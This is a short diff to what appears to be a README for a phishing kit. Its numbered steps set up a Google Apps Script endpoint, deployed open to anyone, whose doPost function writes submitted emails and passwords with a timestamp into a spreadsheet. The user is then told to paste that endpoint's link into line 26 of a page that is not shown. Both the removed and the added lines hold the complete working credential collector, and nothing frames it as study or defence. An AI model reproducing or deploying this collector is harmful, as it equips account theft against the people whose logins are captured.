@@ -6,16 +6,20 @@ at line 26, edit the link
 
 1. create a google sheet
 2. in extensions > appscript
-3. replace all with:
-function doPost(e) {
-    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
-      var email = e.parameter.email;
-        var password = e.parameter.password;
-          var time = new Date();
+3. (javascript) replace all with:
 
-            sheet.appendRow([email, password, time]);
-              return ContentService.createTextOutput("OK");
-              }
+<pre>
+ function doPost(e) {
+  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
+  var email = e.parameter.email;
+  var password = e.parameter.password;
+  var time = new Date();
+
+  sheet.appendRow([email, password, time]);
+  return ContentService.createTextOutput("OK");
+} 
+</pre>
+
 4. deploy [select anyone !important!]
 5. copy link
 6. replace it on line 26
